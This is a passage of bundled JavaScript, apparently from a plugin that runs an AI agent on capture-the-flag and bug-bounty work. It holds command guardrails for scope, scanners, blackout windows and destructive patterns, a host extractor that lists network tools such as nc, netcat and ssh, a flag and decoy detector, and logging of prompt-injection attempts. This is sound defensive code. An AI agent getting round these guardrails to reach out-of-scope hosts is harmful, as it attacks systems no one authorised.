    if (containsNewline) {
      return readonlySegmentsBlockedReason("BOUNTY guardrail blocked multi-line command before scope confirmation.");
    }
    const segments = splitReadonlySegments(sanitized);
    if (segments.length === 0) {
      return readonlySegmentsBlockedReason("BOUNTY guardrail blocked empty command before scope confirmation.");
    }
    for (const segment of segments) {
      if (hasForbiddenReadonlyShellSyntax(segment)) {
        return readonlySegmentsBlockedReason("BOUNTY guardrail blocked unsafe shell syntax before scope confirmation.");
      }
      const segmentAllowed = config2.guardrails.bounty_scope_readonly_patterns.some((pattern) => {
        try {
          return new RegExp(pattern, "i").test(segment);
        } catch {
          return false;
        }
      });
      if (!segmentAllowed) {
        return readonlySegmentsBlockedReason("BOUNTY guardrail blocked non-read-only command before scope confirmation.");
      }
    }
  }
  if (mode === "BOUNTY") {
    if (config2.bounty_policy.deny_scanner_commands) {
      for (const pattern of config2.bounty_policy.scanner_command_patterns) {
        let expression;
        try {
          expression = new RegExp(pattern, "i");
        } catch {
          continue;
        }
        if (expression.test(sanitized)) {
          return denySoft(`BOUNTY guardrail blocked scanner/automation pattern: ${pattern}`);
        }
      }
    }
    const scopePolicy = options?.scopePolicy ?? null;
    const now = options?.now ?? new Date;
    const enforceBlackout = config2.bounty_policy.enforce_blackout_windows;
    const enforceAllowedHosts = config2.bounty_policy.enforce_allowed_hosts;
    const urlHosts = extractUrlHosts(sanitized);
    const networkHosts = extractNetworkHosts(sanitized);
    const hostsToCheck = [...new Set([...urlHosts, ...networkHosts])];
    if (enforceBlackout && scopePolicy && scopePolicy.blackoutWindows.length > 0) {
      if (hostsToCheck.length > 0 && isInBlackout(now, scopePolicy.blackoutWindows)) {
        return denySoft("BOUNTY guardrail blocked network command during blackout window.");
      }
    }
    if (options?.scopeConfirmed === true && enforceAllowedHosts && scopePolicy && hostsToCheck.length > 0) {
      for (const host of hostsToCheck) {
        const verdict = hostMatchesPolicy(host, scopePolicy);
        if (!verdict.allowed) {
          return denySoft(`BOUNTY guardrail blocked out-of-scope host '${host}' (${verdict.reason ?? "policy"}).`);
        }
      }
    }
  }
  if (!config2.guardrails.deny_destructive_bash) {
    return { allow: true, sanitizedCommand: sanitized };
  }
  for (const pattern of config2.guardrails.destructive_command_patterns) {
    let expression;
    try {
      expression = new RegExp(pattern, "i");
    } catch {
      continue;
    }
    if (expression.test(sanitized)) {
      return denyHard(`${mode} guardrail blocked destructive command pattern: ${pattern}`);
    }
  }
  return {
    allow: true,
    sanitizedCommand: sanitized
  };
}
function extractUrlHosts(command) {
  const hosts = [];
  const re = /https?:\/\/[^\s"']+/gi;
  const matches = command.match(re) ?? [];
  for (const raw of matches) {
    try {
      const u = new URL(raw);
      if (u.hostname) {
        hosts.push(u.hostname);
      }
    } catch {
      continue;
    }
  }
  return hosts;
}
function isIPv4(value) {
  const parts = value.split(".");
  if (parts.length !== 4)
    return false;
  for (const part of parts) {
    if (!/^\d{1,3}$/.test(part))
      return false;
    const n = Number(part);
    if (!Number.isFinite(n) || n < 0 || n > 255)
      return false;
  }
  return true;
}
function isIPv6(value) {
  if (!value.includes(":"))
    return false;
  return /^[0-9a-f:]+$/i.test(value);
}
function normalizeHostToken(rawToken) {
  const trimmed = rawToken.replace(/^[`'"\(\{<]+|[`'"\)\}>.,;:]+$/g, "");
  if (!trimmed)
    return "";
  if (trimmed.startsWith("[") && trimmed.includes("]")) {
    const close = trimmed.indexOf("]");
    const inside = trimmed.slice(1, close);
    return inside;
  }
  let token = trimmed.replace(/^\[+|\]+$/g, "");
  const at = token.lastIndexOf("@");
  if (at >= 0 && at < token.length - 1) {
    token = token.slice(at + 1);
  }
  if (token.includes(":") && token.indexOf(":") === token.lastIndexOf(":")) {
    const maybePort = token.slice(token.lastIndexOf(":") + 1);
    if (/^\d{1,5}$/.test(maybePort)) {
      token = token.slice(0, token.lastIndexOf(":"));
    }
  }
  return token.toLowerCase();
}
function extractNetworkHosts(command) {
  const trimmed = command.trim();
  if (!trimmed)
    return [];
  const tokens = trimmed.split(/\s+/);
  if (tokens.length < 2)
    return [];
  const tool = tokens[0].toLowerCase();
  const networkTools = new Set([
    "curl",
    "wget",
    "http",
    "https",
    "ping",
    "dig",
    "nslookup",
    "traceroute",
    "nc",
    "netcat",
    "telnet",
    "ssh"
  ]);
  if (!networkTools.has(tool))
    return [];
  const hosts = new Set;
  for (let i = 1;i < tokens.length; i += 1) {
    const t = tokens[i];
    if (!t)
      continue;
    if (t.startsWith("-"))
      continue;
    const candidates = t.split(",").map((item) => item.trim()).filter(Boolean);
    for (const candidate of candidates) {
      if (/^https?:\/\//i.test(candidate)) {
        try {
          const host2 = new URL(candidate).hostname;
          if (host2) {
            hosts.add(host2.toLowerCase());
          }
        } catch {
          continue;
        }
        continue;
      }
      const host = normalizeHostToken(candidate);
      if (!host)
        continue;
      if (/^[a-z0-9-]+(\.[a-z0-9-]+)+$/i.test(host) || isIPv4(host) || isIPv6(host)) {
        hosts.add(host);
      }
    }
  }
  return [...hosts];
}
function extractBashCommand(metadata) {
  if (!metadata || typeof metadata !== "object") {
    return "";
  }
  const data = metadata;
  const keys = ["command", "cmd", "input", "arguments"];
  for (const key of keys) {
    const value = data[key];
    if (typeof value === "string" && value.trim().length > 0) {
      return value;
    }
  }
  return "";
}

// src/index-core.ts
init_evidence_ledger();

// src/orchestration/parse-oracle-progress.ts
function toInt(value) {
  if (typeof value !== "string")
    return null;
  const trimmed = value.trim();
  if (!/^-?\d+$/.test(trimmed))
    return null;
  const parsed = Number.parseInt(trimmed, 10);
  return Number.isFinite(parsed) ? parsed : null;
}
function normalize(passCount, failIndex, totalTests) {
  if (passCount < 0 || totalTests < 0)
    return null;
  if (failIndex < -1)
    return null;
  return { passCount, failIndex, totalTests };
}
function parseOracleProgressFromText(raw) {
  if (typeof raw !== "string" || raw.trim().length === 0) {
    return null;
  }
  const strict = /ORACLE_PROGRESS\s+pass_count\s*=\s*(-?\d+)\s+fail_index\s*=\s*(-?\d+)\s+total_tests\s*=\s*(-?\d+)/i.exec(raw);
  if (strict) {
    const passCount = toInt(strict[1]);
    const failIndex = toInt(strict[2]);
    const totalTests = toInt(strict[3]);
    if (passCount === null || failIndex === null || totalTests === null)
      return null;
    return normalize(passCount, failIndex, totalTests);
  }
  const fallbackKeyValue = /\bpass\s*=\s*(-?\d+)\b[^\n\r]*?\bfail_index\s*=\s*(-?\d+)\b[^\n\r]*?\btotal\s*=\s*(-?\d+)\b/i.exec(raw);
  if (fallbackKeyValue) {
    const passCount = toInt(fallbackKeyValue[1]);
    const failIndex = toInt(fallbackKeyValue[2]);
    const totalTests = toInt(fallbackKeyValue[3]);
    if (passCount === null || failIndex === null || totalTests === null)
      return null;
    return normalize(passCount, failIndex, totalTests);
  }
  const fallbackFraction = /\bpass\s*[:=]?\s*(-?\d+)\s*\/\s*(?:total\s*[:=]?\s*)?(-?\d+)\b/i.exec(raw);
  if (fallbackFraction) {
    const passCount = toInt(fallbackFraction[1]);
    const totalTests = toInt(fallbackFraction[2]);
    if (passCount === null || totalTests === null)
      return null;
    const failIndex = totalTests > 0 && passCount >= totalTests ? -1 : Math.max(0, passCount);
    return normalize(passCount, failIndex, totalTests);
  }
  return null;
}

// src/orchestration/flag-detector.ts
var DEFAULT_FLAG_PATTERNS = [
  /flag\{[^}]{1,200}\}/gi,
  /CTF\{[^}]{1,200}\}/gi,
  /picoCTF\{[^}]{1,200}\}/gi,
  /htb\{[^}]{1,200}\}/gi,
  /TCTF\{[^}]{1,200}\}/gi,
  /SECCON\{[^}]{1,200}\}/gi,
  /ASIS\{[^}]{1,200}\}/gi,
  /CCTF\{[^}]{1,200}\}/gi,
  /hxp\{[^}]{1,200}\}/gi,
  /PCTF\{[^}]{1,200}\}/gi,
  /dice\{[^}]{1,200}\}/gi,
  /uiuctf\{[^}]{1,200}\}/gi,
  /ictf\{[^}]{1,200}\}/gi,
  /actf\{[^}]{1,200}\}/gi,
  /zer0pts\{[^}]{1,200}\}/gi
];
var FAKE_PLACEHOLDER_RE2 = /(?:fake|placeholder|example|sample|dummy|mock|test[_-]?flag|not[_-]?real|decoy)/i;
function cloneAsGlobalRegex(pattern) {
  const flags = pattern.flags.includes("g") ? pattern.flags : `${pattern.flags}g`;
  return new RegExp(pattern.source, flags);
}
function confidenceForFlag(flag) {
  const trimmed = flag.trim();
  if (!trimmed || trimmed.length < 6 || trimmed.length > 220) {
    return "low";
  }
  const openBrace = trimmed.indexOf("{");
  const payload = openBrace >= 0 && trimmed.endsWith("}") ? trimmed.slice(openBrace + 1, -1) : trimmed;
  if (FAKE_PLACEHOLDER_RE2.test(payload)) {
    return "low";
  }
  const hasWhitespace = /\s/.test(trimmed);
  const hasBalancedBraces = trimmed.includes("{") && trimmed.endsWith("}");
  if (hasBalancedBraces && !hasWhitespace) {
    return "high";
  }
  if (hasBalancedBraces) {
    return "medium";
  }
  return "low";
}
function inferFormat(flag) {
  const openBrace = flag.indexOf("{");
  if (openBrace <= 0) {
    return "unknown";
  }
  return `${flag.slice(0, openBrace)}{...}`;
}
function dedupe(items) {
  const seen = new Set;
  const output = [];
  for (const item of items) {
    const key = `${item.flag}|${item.source}`;
    if (seen.has(key)) {
      continue;
    }
    seen.add(key);
    output.push(item);
  }
  return output;
}

class FlagDetectorStore {
  candidates = [];
  customPattern = null;
  setCustomFlagPattern(pattern) {
    const normalized = pattern.trim();
    if (!normalized) {
      this.customPattern = null;
      return;
    }
    try {
      this.customPattern = new RegExp(normalized, "gi");
    } catch {
      throw new Error(`Invalid custom flag pattern: ${pattern}`);
    }
  }
  getPatterns() {
    return this.customPattern ? [this.customPattern, ...DEFAULT_FLAG_PATTERNS] : DEFAULT_FLAG_PATTERNS;
  }
  scanForFlags(text, source) {
    const safeText = text ?? "";
    if (!safeText) {
      return [];
    }
    const safeSource = source.trim() || "unknown";
    const now = Date.now();
    const patterns = this.getPatterns();
    const found = [];
    for (const pattern of patterns) {
      const globalRegex = cloneAsGlobalRegex(pattern);
      const matches = safeText.matchAll(globalRegex);
      for (const match of matches) {
        const raw = match[0]?.trim() ?? "";
        if (!raw) {
          continue;
        }
        found.push({
          flag: raw,
          format: inferFormat(raw),
          source: safeSource,
          confidence: confidenceForFlag(raw),
          timestamp: now
        });
      }
    }
    const uniqueFound = dedupe(found);
    if (uniqueFound.length === 0) {
      return [];
    }
    const existingKeys = new Set(this.candidates.map((c) => `${c.flag}|${c.source}`));
    for (const candidate of uniqueFound) {
      const key = `${candidate.flag}|${candidate.source}`;
      if (existingKeys.has(key)) {
        continue;
      }
      this.candidates.push(candidate);
      existingKeys.add(key);
    }
    return uniqueFound;
  }
  getCandidates() {
    return [...this.candidates].sort((a, b) => b.timestamp - a.timestamp);
  }
  clearCandidates() {
    this.candidates.length = 0;
  }
  containsFlag(text) {
    const safeText = text ?? "";
    if (!safeText) {
      return false;
    }
    const patterns = this.getPatterns();
    return patterns.some((pattern) => cloneAsGlobalRegex(pattern).test(safeText));
  }
}
var defaultStore = new FlagDetectorStore;
function setCustomFlagPattern(pattern) {
  defaultStore.setCustomFlagPattern(pattern);
}
function scanForFlags(text, source) {
  return defaultStore.scanForFlags(text, source);
}
function getCandidates() {
  return defaultStore.getCandidates();
}
function buildFlagAlert(flagCandidates) {
  if (!flagCandidates || flagCandidates.length === 0) {
    return "";
  }
  const lines = [
    `Potential flags detected (${flagCandidates.length}):`,
    "Treat these as CANDIDATES until official verifier confirms Correct/Accepted."
  ];
  for (const candidate of flagCandidates) {
    lines.push(`- ${candidate.flag} | format=${candidate.format} | confidence=${candidate.confidence} | source=${candidate.source}`);
  }
  return lines.join(`
`);
}
function containsFlag(text) {
  return defaultStore.containsFlag(text);
}
var DECOY_KEYWORDS_RE = /\b(fake|decoy|dummy|placeholder|not[_-]?real|wrong|sample|example|FAKE_FLAG)\b/i;
function checkForDecoy(candidates, oraclePassed) {
  if (candidates.length === 0) {
    return { isDecoySuspect: false, reason: "", decoyCandidates: [] };
  }
  const decoyCandidates = candidates.filter((c) => DECOY_KEYWORDS_RE.test(c.flag) || c.confidence === "low");
  if (decoyCandidates.length > 0 && !oraclePassed) {
    return {
      isDecoySuspect: true,
      reason: `Flag(s) contain decoy keywords (${decoyCandidates.map((c) => c.flag).join(", ")}) and oracle rejected`,
      decoyCandidates
    };
  }
  if (!oraclePassed && candidates.length > 0) {
    return {
      isDecoySuspect: true,
      reason: `Flag candidate(s) found but oracle rejected \u2014 possible decoy path`,
      decoyCandidates: candidates
    };
  }
  return { isDecoySuspect: false, reason: "", decoyCandidates: [] };
}
var REPLAY_UNSAFE_INDICATORS = [
  "memfd_create",
  "fexecve",
  "mmap",
  "MAP_ANONYMOUS",
  ".rela.p",
  ".sym.p",
  "process_vm_readv",
  "ptrace"
];
function isReplayUnsafe(stringsOutput, readelfOutput) {
  const signals = [];
  const combined = `${stringsOutput ?? ""}
${readelfOutput ?? ""}`;
  for (const indicator of REPLAY_UNSAFE_INDICATORS) {
    if (combined.includes(indicator)) {
      signals.push(indicator);
    }
  }
  return {
    unsafe: signals.length >= 2,
    signals
  };
}

// src/state/notes-store.ts
import {
  accessSync,
  appendFileSync as appendFileSync2,
  constants,
  existsSync as existsSync8,
  mkdirSync as mkdirSync4,
  readFileSync as readFileSync7,
  renameSync as renameSync3,
  writeFileSync as writeFileSync3
} from "fs";
import { join as join9 } from "path";

// src/state/debounced-sync-flusher.ts
class DebouncedSyncFlusher {
  options;
  queued = false;
  timer = null;
  inFlight = false;
  constructor(options) {
    this.options = options;
  }
  request() {
    if (this.options.isBlocked()) {
      return;
    }
    if (!this.options.enabled) {
      this.flush("immediate");
      return;
    }
    this.queued = true;
    if (!this.timer) {
      this.schedule();
    }
  }
  flushNow() {
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = null;
    }
    this.flush("manual");
  }
  schedule() {
    this.timer = setTimeout(() => {
      this.timer = null;
      this.flush("timer");
    }, this.options.delayMs);
    if (this.timer && typeof this.timer.unref === "function") {
      this.timer.unref();
    }
  }
  flush(trigger) {
    if (this.options.isBlocked()) {
      return;
    }
    if (this.inFlight) {
      this.queued = true;
      return;
    }
    if (trigger !== "immediate" && !this.queued) {
      return;
    }
    this.inFlight = true;
    this.queued = false;
    const startedAt = process.hrtime.bigint();
    const result = this.options.runSync();
    const durationMs = Number(process.hrtime.bigint() - startedAt) / 1e6;
    this.inFlight = false;
    if (this.options.onMetric) {
      this.options.onMetric(this.options.buildMetric({
        trigger,
        durationMs,
        result
      }));
    }
    if (this.queued && this.options.enabled && !this.timer) {
      this.schedule();
    }
  }
}

// src/state/notes-store.ts
class NotesStore {
  rootDir;
  archiveDir;
  asyncPersistence;
  onFlush;
  budgets;
  persistenceDegraded = false;
  pendingByFile = new Map;
  flushFlusher;
  constructor(baseDirectory, markdownBudget, rootDirName = ".Aegis", options = {}) {
    this.rootDir = join9(baseDirectory, rootDirName);
    this.archiveDir = join9(this.rootDir, "archive");
    this.asyncPersistence = options.asyncPersistence === true;
    const flushDelayMs = typeof options.flushDelayMs === "number" && Number.isFinite(options.flushDelayMs) ? Math.max(0, Math.floor(options.flushDelayMs)) : 35;
    this.onFlush = options.onFlush;
    this.budgets = {
      WORKLOG: { lines: markdownBudget.worklog_lines, bytes: markdownBudget.worklog_bytes },
      EVIDENCE: { lines: markdownBudget.evidence_lines, bytes: markdownBudget.evidence_bytes },
      SCAN: { lines: markdownBudget.scan_lines, bytes: markdownBudget.scan_bytes },
      CONTEXT_PACK: {
        lines: markdownBudget.context_pack_lines,
        bytes: markdownBudget.context_pack_bytes
      }
    };
    this.flushFlusher = new DebouncedSyncFlusher({
      enabled: this.asyncPersistence,
      delayMs: flushDelayMs,
      isBlocked: () => this.persistenceDegraded,
      runSync: () => this.flushPendingSync(),
      buildMetric: ({ trigger, durationMs, result }) => ({
        trigger,
        durationMs,
        filesTouched: result.filesTouched,
        appendBytes: result.appendBytes,
        replaceBytes: result.replaceBytes,
        asyncPersistence: this.asyncPersistence,
        failed: !result.ok,
        reason: result.reason
      }),
      onMetric: this.onFlush
    });
  }
  getRootDirectory() {
    return this.rootDir;
  }
  flushNow() {
    this.flushFlusher.flushNow();
  }
  checkWritable() {
    const issues = [];
    try {
      this.ensureFiles();
    } catch (error48) {
      const message = error48 instanceof Error ? error48.message : String(error48);
      issues.push(`failed to initialize notes directory '${this.rootDir}': ${message}`);
      return { ok: false, issues };
    }
    const targets = [
      this.rootDir,
      join9(this.rootDir, "STATE.md"),
      join9(this.rootDir, "WORKLOG.md"),
      join9(this.rootDir, "EVIDENCE.md"),
      join9(this.rootDir, "SCAN.md"),
      join9(this.rootDir, "CONTEXT_PACK.md")
    ];
    for (const target of targets) {
      try {
        accessSync(target, constants.W_OK);
      } catch (error48) {
        const message = error48 instanceof Error ? error48.message : String(error48);
        issues.push(`not writable: ${target} (${message})`);
      }
    }
    return { ok: issues.length === 0, issues };
  }
  ensureFiles() {
    mkdirSync4(this.rootDir, { recursive: true });
    mkdirSync4(this.archiveDir, { recursive: true });
    this.ensureFile("STATE.md", `# STATE
`);
    this.ensureFile("WORKLOG.md", `# WORKLOG
`);
    this.ensureFile("EVIDENCE.md", `# EVIDENCE
`);
    this.ensureFile("SCAN.md", `# SCAN
`);
    this.ensureFile("CONTEXT_PACK.md", `# CONTEXT_PACK
`);
  }
  recordChange(sessionID, state, reason, decision) {
    if (!this.asyncPersistence) {
      this.ensureFiles();
      this.writeState(sessionID, state, decision);
      this.writeContextPack(sessionID, state, decision);
      this.appendWorklog(sessionID, state, reason, decision);
      if (reason === "submit_accepted") {
        this.appendEvidence(sessionID, state);
      }
      return;
    }
    const stateContent = this.buildStateContent(sessionID, state, decision);
    this.queueReplace("STATE.md", stateContent, null);
    const contextPackContent = this.buildContextPackContent(sessionID, state, decision);
    this.queueReplace("CONTEXT_PACK.md", contextPackContent, this.budgets.CONTEXT_PACK);
    const worklogBlock = this.buildWorklogBlock(sessionID, state, reason, decision);
    this.queueAppend("WORKLOG.md", worklogBlock, this.budgets.WORKLOG);
    if (reason === "submit_accepted") {
      const evidenceBlock = this.buildEvidenceBlock(sessionID, state);
      if (evidenceBlock) {
        this.queueAppend("EVIDENCE.md", evidenceBlock, this.budgets.EVIDENCE);
      }
    }
    this.flushFlusher.request();
  }
  recordScan(summary) {
    const block = `
## ${this.now()}
- ${summary}
`;
    if (!this.asyncPersistence) {
      this.appendWithBudget("SCAN.md", block, this.budgets.SCAN);
      return;
    }
    this.queueAppend("SCAN.md", block, this.budgets.SCAN);
    this.flushFlusher.request();
  }
  recordInjectionAttempt(source, indicators, snippet) {
    const compactSnippet = snippet.replace(/\s+/g, " ").trim().slice(0, 240);
    const summary = `INJECTION-ATTEMPT source=${source} indicators=${indicators.join(",")} snippet=${compactSnippet || "(empty)"}`;
    this.recordScan(summary);
  }
  checkBudgets() {
    this.flushNow();
    this.ensureFiles();
    return [
      this.inspectFile("WORKLOG.md", this.budgets.WORKLOG),
      this.inspectFile("EVIDENCE.md", this.budgets.EVIDENCE),
      this.inspectFile("SCAN.md", this.budgets.SCAN),
      this.inspectFile("CONTEXT_PACK.md", this.budgets.CONTEXT_PACK)
    ].filter((issue2) => issue2 !== null);
  }
  compactNow() {
    this.flushNow();
    this.ensureFiles();
    const actions = [];
    const files = [
      ["WORKLOG.md", this.budgets.WORKLOG],
      ["EVIDENCE.md", this.budgets.EVIDENCE],
      ["SCAN.md", this.budgets.SCAN],
      ["CONTEXT_PACK.md", this.budgets.CONTEXT_PACK]
    ];
    for (const [fileName, budget] of files) {
      const rotated = this.rotateIfNeeded(fileName, budget);
      if (rotated) {
        actions.push(`ROTATED ${fileName}`);
      }
    }
    if (actions.length === 0) {
      actions.push("No files exceeded markdown budget.");
    }
    return actions;
  }
  ensureFile(fileName, initial) {
    const path = join9(this.rootDir, fileName);
    if (!existsSync8(path)) {
      writeFileSync3(path, `${initial}
`, "utf-8");
    }
  }
  writeState(sessionID, state, decision) {
    const path = join9(this.rootDir, "STATE.md");
    writeFileSync3(path, this.buildStateContent(sessionID, state, decision), "utf-8");
  }
  buildStateContent(sessionID, state, decision) {
    return [
      "# STATE",
      `updated_at: ${this.now()}`,
      `session_id: ${sessionID}`,
      `mode: ${state.mode}`,
      `phase: ${state.phase}`,
      `target: ${state.targetType}`,
      `scope_confirmed: ${state.scopeConfirmed}`,
      `candidate_pending_verification: ${state.candidatePendingVerification}`,
      `candidate_level: ${state.candidateLevel}`,
      `latest_candidate: ${state.latestCandidate || "(none)"}`,
      `latest_verified: ${state.latestVerified || "(none)"}`,
      `submission_pending: ${state.submissionPending}`,
      `submission_accepted: ${state.submissionAccepted}`,
      `latest_acceptance_evidence: ${state.latestAcceptanceEvidence || "(none)"}`,
      `hypothesis: ${state.hypothesis || "(none)"}`,
      `next_route: ${decision.primary}`,
      `next_reason: ${decision.reason}`,
      ""
    ].join(`
`);
  }
  writeContextPack(sessionID, state, decision) {
    const path = join9(this.rootDir, "CONTEXT_PACK.md");
    writeFileSync3(path, this.buildContextPackContent(sessionID, state, decision), "utf-8");
    this.rotateIfNeeded("CONTEXT_PACK.md", this.budgets.CONTEXT_PACK);
  }
  buildContextPackContent(sessionID, state, decision) {
    return [
      "# CONTEXT_PACK",
      `updated_at: ${this.now()}`,
      `session_id: ${sessionID}`,
      `mode=${state.mode}, phase=${state.phase}, target=${state.targetType}`,
      `scope_confirmed=${state.scopeConfirmed}, candidate_pending=${state.candidatePendingVerification}`,
      `candidate_level=${state.candidateLevel}, submission_pending=${state.submissionPending}, submission_accepted=${state.submissionAccepted}`,
      `verify_fail_count=${state.verifyFailCount}, no_new_evidence=${state.noNewEvidenceLoops}, same_payload=${state.samePayloadLoops}`,
      `context_fail=${state.contextFailCount}, timeout_fail=${state.timeoutFailCount}`,
      `latest_candidate=${state.latestCandidate || "(none)"}`,
      `latest_verified=${state.latestVerified || "(none)"}`,
      `latest_acceptance_evidence=${state.latestAcceptanceEvidence || "(none)"}`,
      `hypothesis=${state.hypothesis || "(none)"}`,
      `next_route=${decision.primary}`,
      ""
    ].join(`
`);
  }
  appendWorklog(sessionID, state, reason, decision) {
    this.appendWithBudget("WORKLOG.md", this.buildWorklogBlock(sessionID, state, reason, decision), this.budgets.WORKLOG);
  }
  buildWorklogBlock(sessionID, state, reason, decision) {
    return [
      "",
      `## ${this.now()}`,
      `- session: ${sessionID}`,
      `- reason: ${reason}`,
      `- mode/phase/target: ${state.mode}/${state.phase}/${state.targetType}`,
      `- scope/candidate: ${state.scopeConfirmed}/${state.candidatePendingVerification}`,
      `- level/submission: ${state.candidateLevel} pending=${state.submissionPending} accepted=${state.submissionAccepted}`,
      `- counters: verify_fail=${state.verifyFailCount}, no_new=${state.noNewEvidenceLoops}, same_payload=${state.samePayloadLoops}, context_fail=${state.contextFailCount}, timeout_fail=${state.timeoutFailCount}`,
      `- next: ${decision.primary} (${decision.reason})`,
      ""
    ].join(`
`);
  }
  appendEvidence(sessionID, state) {
    const block = this.buildEvidenceBlock(sessionID, state);
    if (!block) {
      return;
    }
    this.appendWithBudget("EVIDENCE.md", block, this.budgets.EVIDENCE);
  }
  buildEvidenceBlock(sessionID, state) {
    const verified = state.latestVerified || state.latestCandidate;
    if (!verified) {
      return null;
    }
    return [
      "",
      `## ${this.now()}`,
      `- session: ${sessionID}`,
      `- verified: ${verified}`,
      `- candidate_level: ${state.candidateLevel}`,
      `- acceptance_evidence: ${state.latestAcceptanceEvidence || "(none)"}`,
      ""
    ].join(`
`);
  }
  appendWithBudget(fileName, content, budget) {
    const path = join9(this.rootDir, fileName);
    appendFileSync2(path, content, "utf-8");
    this.rotateIfNeeded(fileName, budget);
  }
  queueReplace(fileName, content, budget) {
    if (this.persistenceDegraded) {
      return;
    }
    const current = this.pendingByFile.get(fileName) ?? { replace: null, append: [], budget: null };
    current.replace = content;
    if (budget) {
      current.budget = budget;
    }
    this.pendingByFile.set(fileName, current);
  }
  queueAppend(fileName, content, budget) {
    if (this.persistenceDegraded) {
      return;
    }
    const current = this.pendingByFile.get(fileName) ?? { replace: null, append: [], budget: null };
    current.append.push(content);
    if (budget) {
      current.budget = budget;
    }
    this.pendingByFile.set(fileName, current);
  }
  flushPendingSync() {
    const filesTouched = this.pendingByFile.size;
    if (filesTouched === 0) {
      return { ok: true, filesTouched: 0, appendBytes: 0, replaceBytes: 0, reason: "" };
    }
    let appendBytes = 0;
    let replaceBytes = 0;
    try {
      this.ensureFiles();
      for (const [fileName, pending] of this.pendingByFile.entries()) {
        const path = join9(this.rootDir, fileName);
        if (pending.replace !== null) {
          writeFileSync3(path, pending.replace, "utf-8");
          replaceBytes += Buffer.byteLength(pending.replace, "utf-8");
        }
        if (pending.append.length > 0) {
          const chunk = pending.append.join("");
          appendFileSync2(path, chunk, "utf-8");
          appendBytes += Buffer.byteLength(chunk, "utf-8");
        }
        if (pending.budget) {
          this.rotateIfNeeded(fileName, pending.budget);
        }
      }
      this.pendingByFile.clear();
      return { ok: true, filesTouched, appendBytes, replaceBytes, reason: "" };
    } catch {
      this.persistenceDegraded = true;
      return { ok: false, filesTouched, appendBytes, replaceBytes, reason: "flush_failed" };
    }
  }
  rotateIfNeeded(fileName, budget) {
    const path = join9(this.rootDir, fileName);
    if (!existsSync8(path)) {
      return false;
    }
    const content = readFileSync7(path, "utf-8");
    const lineCount = content.length === 0 ? 0 : content.split(/\r?\n/).length;
    const byteCount = Buffer.byteLength(content, "utf-8");
    if (lineCount <= budget.lines && byteCount <= budget.bytes) {
      return false;
    }
    const stamp = this.archiveStamp();
    const stem = fileName.replace(/\.md$/i, "");
    const archived = join9(this.archiveDir, `${stem}_${stamp}.md`);
    renameSync3(path, archived);
    writeFileSync3(path, `# ${stem}

Rotated at ${this.now()}

`, "utf-8");
    return true;
  }
  inspectFile(fileName, budget) {
    const path = join9(this.rootDir, fileName);
    if (!existsSync8(path)) {
      return null;
    }
    const content = readFileSync7(path, "utf-8");
    const lineCount = content.length === 0 ? 0 : content.split(/\r?\n/).length;
    const byteCount = Buffer.byteLength(content, "utf-8");
    if (lineCount <= budget.lines && byteCount <= budget.bytes) {
      return null;
    }
    return {
      fileName,
      lineCount,
      byteCount,
      maxLines: budget.lines,
      maxBytes: budget.bytes
    };
  }
  now() {
    return new Date().toISOString();
  }
  archiveStamp() {
    return new Date().toISOString().replace(/[:.]/g, "-");
  }
}

// src/state/session-id.ts
function normalizeSessionID(sessionID) {
  const normalized = sessionID.replace(/[^a-z0-9_-]+/gi, "_").slice(0, 64);
  return normalized.length > 0 ? normalized : "session";
}

// src/state/session-store.ts
import { existsSync as existsSync9, mkdirSync as mkdirSync5, readFileSync as readFileSync8 } from "fs";
import { dirname as dirname4, join as join10 } from "path";

// src/io/atomic-write.ts
import { renameSync as renameSync4, rmSync, writeFileSync as writeFileSync4 } from "fs";
function atomicWriteFileSync(filePath, payload) {
  const tmpPath = `${filePath}.tmp`;
  writeFileSync4(tmpPath, payload, "utf-8");
  try {
    renameSync4(tmpPath, filePath);
  } catch {
    try {
      rmSync(filePath, { force: true });
      renameSync4(tmpPath, filePath);
    } catch {
      writeFileSync4(filePath, payload, "utf-8");
    }
  }
}

// src/state/session-store.ts
var FailureReasonCountsSchema = exports_external.object({
  none: exports_external.number().int().nonnegative(),
  verification_mismatch: exports_external.number().int().nonnegative(),
  tooling_timeout: exports_external.number().int().nonnegative(),
  context_overflow: exports_external.number().int().nonnegative(),
  hypothesis_stall: exports_external.number().int().nonnegative(),
  unsat_claim: exports_external.number().int().nonnegative(),
  static_dynamic_contradiction: exports_external.number().int().nonnegative(),
  exploit_chain: exports_external.number().int().nonnegative(),
  environment: exports_external.number().int().nonnegative()
});
var ModelHealthEntrySchema = exports_external.object({
  unhealthySince: exports_external.number().int().nonnegative().default(0),
  reason: exports_external.string().default("")
});
var SubagentDispatchHealthSchema = exports_external.object({
  successCount: exports_external.number().int().nonnegative().default(0),
  retryableFailureCount: exports_external.number().int().nonnegative().default(0),
  hardFailureCount: exports_external.number().int().nonnegative().default(0),
  consecutiveFailureCount: exports_external.number().int().nonnegative().default(0),
  lastOutcomeAt: exports_external.number().int().nonnegative().default(0)
});
var SubagentProfileOverrideSchema = exports_external.object({
  model: exports_external.string().min(1),
  variant: exports_external.string().min(1)
});
var SessionStateSchema = exports_external.object({
  mode: exports_external.enum(["CTF", "BOUNTY"]),
  modeExplicit: exports_external.boolean().default(false),
  ultraworkEnabled: exports_external.boolean().default(false),
  thinkMode: exports_external.enum(["none", "think", "ultrathink"]).default("none"),
  autoLoopEnabled: exports_external.boolean().default(false),
  autoLoopIterations: exports_external.number().int().nonnegative().default(0),
  autoLoopStartedAt: exports_external.number().int().nonnegative().default(0),
  autoLoopLastPromptAt: exports_external.number().int().nonnegative().default(0),
  phase: exports_external.enum(["SCAN", "PLAN", "EXECUTE", "VERIFY", "SUBMIT"]),
  targetType: exports_external.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]),
  scopeConfirmed: exports_external.boolean(),
  candidatePendingVerification: exports_external.boolean(),
  latestCandidate: exports_external.string(),
  latestVerified: exports_external.string(),
  latestAcceptanceEvidence: exports_external.string().default(""),
  candidateLevel: exports_external.enum(["L0", "L1", "L2", "L3"]).default("L0"),
  submissionPending: exports_external.boolean().default(false),
  submissionAccepted: exports_external.boolean().default(false),
  hypothesis: exports_external.string(),
  alternatives: exports_external.array(exports_external.string()),
  noNewEvidenceLoops: exports_external.number().int().nonnegative(),
  samePayloadLoops: exports_external.number().int().nonnegative(),
  staleToolPatternLoops: exports_external.number().int().nonnegative().default(0),
  lastToolPattern: exports_external.string().default(""),
  contradictionPivotDebt: exports_external.number().int().nonnegative().default(0),
  contradictionPatchDumpDone: exports_external.boolean().default(false),
